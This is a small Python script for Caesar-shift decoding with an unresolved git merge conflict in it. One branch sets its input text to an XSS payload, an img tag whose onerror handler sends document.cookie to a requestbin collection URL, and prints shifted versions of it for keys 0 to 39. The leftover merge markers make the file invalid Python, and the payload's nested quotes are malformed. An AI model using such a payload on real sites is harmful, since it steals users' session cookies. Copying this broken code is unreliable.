def decoding(encode_str,n):
    decode_str=""
    for i in encode_str:
        if(ord(i) >= 65 and ord(i) <= 90):
            if(ord(i) - n < 65):
                x=chr(ord(i)+(26-n))
            else:
                x=chr(ord(i)-n)
            decode_str += x
        elif (ord(i) >= 97 and ord(i) <= 122):
            if(ord(i)-n < 97):
                x=chr(ord(i)+(26-n))
            else:
                x=chr(ord(i)-n)
            decode_str += x
        else:
            decode_str += i
    return decode_str

<<<<<<< HEAD
text = ""
for i in range(1,40):
    print str(i) + ","+"=>"+decoding(text,i)+" Key="+str(i)
=======
text = "<img src='hehe.png' onerror='location.href='http://requestbin.fullcontact.com/v5lt48v5'%2Bdocument.cookie'>"
for i in range(0,40):
    print (str(i) + ","+"=>"+decoding(text,i)+" Key="+str(i))
>>>>>>> 56befc405b6765af74a6b8b436c18abbd09f5006
